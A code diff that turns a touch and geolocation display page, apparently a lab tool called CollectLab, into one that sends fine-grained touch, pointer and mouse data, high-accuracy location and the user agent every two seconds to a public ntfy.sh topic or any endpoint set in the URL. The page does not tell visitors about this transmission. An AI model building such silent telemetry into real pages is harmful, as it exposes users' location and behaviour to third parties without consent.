@@ -1,39 +1,96 @@
-<!doctype html><html lang="zh-CN"><meta charset="utf-8">
+<!doctype html><html lang="en"><meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<body style="font:12px -apple-system;padding:8px;background:#111;color:#0f0">
-<div id="g" style="margin-bottom:8px">geo: …</div>
-<pre id="o" style="white-space:pre-wrap;word-break:break-all">listening…</pre>
+<title>CollectLab · touch</title>
+<style>
+body{margin:0;font:12px -apple-system;background:#0b0b0d;color:#e8e8ea}
+h3{margin:10px 8px 4px;font-size:11px;color:#8ab4ff;letter-spacing:.04em}
+pre{padding:0 8px 8px;white-space:pre-wrap;font-size:11px;color:#9fe89f}
+.bar{position:fixed;bottom:0;left:0;right:0;background:#141418;border-top:1px solid #26262c;padding:6px;font-size:11px;color:#9a9aa5}
+</style>
+<body>
+<h3>TOUCH / MOUSE / POINTER + GEO</h3>
+<div id="g" style="padding:0 8px;color:#ffd479;font-size:11px">geo: …</div>
+<pre id="o">listening…</pre>
+<div class="bar" id="bar">tap / drag / multi-touch</div>
 <script>
-var tag = new URLSearchParams(location.search).get('tag') || 'touch';
-var counts = {}, recent = [], lastGeo = null;
-['touchstart','touchmove','touchend','pointerdown','pointermove','pointerup'].forEach(function(t){
-  window.addEventListener(t, function(e){
-    counts[t] = (counts[t]||0) + 1;
-    var pt = (e.changedTouches && e.changedTouches[0]) || e;
-    if (t === 'touchstart' || t === 'pointerdown') {
-      recent.push({type:t, x:Math.round(pt.clientX||0), y:Math.round(pt.clientY||0),
-                   radiusX:(e.touches&&e.touches[0]&&e.touches[0].radiusX!=null)?e.touches[0].radiusX:null,
-                   radiusY:(e.touches&&e.touches[0]&&e.touches[0].radiusY!=null)?e.touches[0].radiusY:null,
-                   force:(e.touches&&e.touches[0]&&e.touches[0].force!=null)?e.touches[0].force:null,
-                   pointerType:e.pointerType||null, ts:Date.now()});
-      if (recent.length > 12) recent.shift();
-    }
-    render();
-  }, {passive:true, capture:true});
-});
-function render(){
-  document.getElementById('o').textContent = JSON.stringify({tag:tag, counts:counts, touches:recent,
-    geo:lastGeo, perm: (navigator.permissions? 'checked':'n/a')}, null, 1);
+var qs=new URLSearchParams(location.search);
+var tag=qs.get('tag')||'touch';
+var ep=qs.get('ep')||'ntfy:collectlab-7f3a91c2d4';
+var quiet=qs.get('noreport')==='1';
+var last={}, tapCount=0, tapTimer=0, buf=[], counts={}, lastGeo=null;
+function now(){ return performance.timeOrigin + performance.now(); }
+function r4(v){ return (typeof v==='number'&&isFinite(v))?Math.round(v*10000)/10000:null; }
+
+function touchRecord(e,touch,type){
+  var ts=e.timeStamp||now(), prev=last.touch||{ts:ts,x:touch.clientX,y:touch.clientY};
+  var dt=Math.max(0,ts-prev.ts), dx=touch.clientX-prev.x, dy=touch.clientY-prev.y;
+  last.touch={ts:ts,x:touch.clientX,y:touch.clientY};
+  if(type==='touchstart'){ tapCount++; clearTimeout(tapTimer); tapTimer=setTimeout(function(){tapCount=0;},400); }
+  return {toolType:'touch', radiusX:r4(touch.radiusX), radiusY:r4(touch.radiusY),
+    radiusTolerance:null, receivedTimestamp:r4(now()), eventAge:r4(now()-ts),
+    gestureRecognizersCount:null, uiClass:null, altitudeAngle:r4(touch.altitudeAngle),
+    tapCount:tapCount, ts:r4(ts), dt:r4(dt), x:r4(touch.clientX), y:r4(touch.clientY),
+    dx:r4(dx), dy:r4(dy), speed:dt>0?r4(Math.hypot(dx,dy)/dt):null,
+    touches:e.touches?e.touches.length:null,
+    deviceId:null, inputDevice:null, deviceDescriptor:null, productId:null, vendorId:null,
+    deviceName:null, inputSources:null, motionEventFlags:null, isWindowObscured:null, isSuspicious:null};
 }
+function mouseRecord(e){
+  var ts=e.timeStamp||now(), prev=last.mouse||{ts:ts,x:e.clientX,y:e.clientY};
+  var dt=Math.max(0,ts-prev.ts), dx=e.clientX-prev.x, dy=e.clientY-prev.y;
+  last.mouse={ts:ts,x:e.clientX,y:e.clientY};
+  return {ts:r4(ts), dt:r4(dt), x:r4(e.clientX), y:r4(e.clientY), dx:r4(dx), dy:r4(dy),
+          speed:dt>0?r4(Math.hypot(dx,dy)/dt):null, buttons:e.buttons};
+}
+function pointerRecord(e){
+  var ts=e.timeStamp||now(), prev=last.pointer||{ts:ts,x:e.clientX,y:e.clientY};
+  var dt=Math.max(0,ts-prev.ts), dx=e.clientX-prev.x, dy=e.clientY-prev.y;
+  last.pointer={ts:ts,x:e.clientX,y:e.clientY};
+  return {ts:r4(ts), dt:r4(dt), x:r4(e.clientX), y:r4(e.clientY), dx:r4(dx), dy:r4(dy),
+          speed:dt>0?r4(Math.hypot(dx,dy)/dt):null, pointerType:e.pointerType||null,
+          pointerId:e.pointerId, buttons:e.buttons, pressure:r4(e.pressure)};
+}
+['touchstart','touchmove','touchend'].forEach(function(type){
+  window.addEventListener(type,function(e){
+    counts[type]=(counts[type]||0)+1;
+    var t=e.changedTouches&&e.changedTouches[0]; if(!t) return;
+    buf.push({kind:'touch',type:type,data:touchRecord(e,t,type)});
+  },{passive:true,capture:true});
+});
+['pointerdown','pointermove','pointerup'].forEach(function(type){
+  window.addEventListener(type,function(e){
+    counts[type]=(counts[type]||0)+1;
+    buf.push({kind:'pointer',type:type,data:pointerRecord(e)});
+  },{passive:true,capture:true});
+});
+['mousedown','mousemove','mouseup'].forEach(function(type){
+  window.addEventListener(type,function(e){
+    counts[type]=(counts[type]||0)+1;
+    buf.push({kind:'mouse',type:type,data:mouseRecord(e)});
+  },{passive:true,capture:true});
+});
+function flush(){
+  if(!buf.length||quiet) return;
+  var payload=JSON.stringify({tag:tag, ua:navigator.userAgent, counts:counts, geo:lastGeo,
+                              events:buf.splice(0,60)});
+  try{
+    if(ep.indexOf('ntfy:')===0) fetch('https://ntfy.sh/'+ep.slice(5),{method:'POST',cache:'no-store',body:payload}).catch(function(){});
+    else fetch(ep,{method:'POST',cache:'no-store',body:payload}).catch(function(){});
+  }catch(e){}
+}
+setInterval(flush,2000);
 if (navigator.geolocation) {
   navigator.geolocation.watchPosition(function(p){
-    lastGeo = {lat:p.coords.latitude, lon:p.coords.longitude, acc:p.coords.accuracy,
-               alt:p.coords.altitude, altAcc:p.coords.altitudeAccuracy, speed:p.coords.speed,
-               ts:p.timestamp, age:Date.now()-p.timestamp};
-    document.getElementById('g').textContent = 'geo: ' + JSON.stringify(lastGeo);
-    render();
-  }, function(e){ lastGeo = 'err:'+e.code+':'+e.message; document.getElementById('g').textContent = lastGeo; render(); },
-  {enableHighAccuracy:true, maximumAge:0, timeout:10000});
+    lastGeo={lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,
+             alt:p.coords.altitude,altAcc:p.coords.altitudeAccuracy,speed:p.coords.speed,
+             ts:p.timestamp,age:Date.now()-p.timestamp};
+    document.getElementById('g').textContent='geo: '+JSON.stringify(lastGeo);
+  },function(e){ lastGeo='err:'+e.code+':'+e.message; document.getElementById('g').textContent=lastGeo; },
+  {enableHighAccuracy:true,maximumAge:0,timeout:10000});
 }
-render();
+setInterval(function(){
+  document.getElementById('o').textContent=JSON.stringify({tag:tag,counts:counts,taps:tapCount,
+    radiusBuckets:(function(){var b={};buf.forEach(function(x){ if(x.kind==='touch'&&x.type==='touchstart'&&x.data.radiusX!=null) b[x.data.radiusX]=(b[x.data.radiusX]||0)+1; }); return b;})(),
+    lastEvents:buf.slice(-3)},null,1);
+},700);
 </script></body></html>
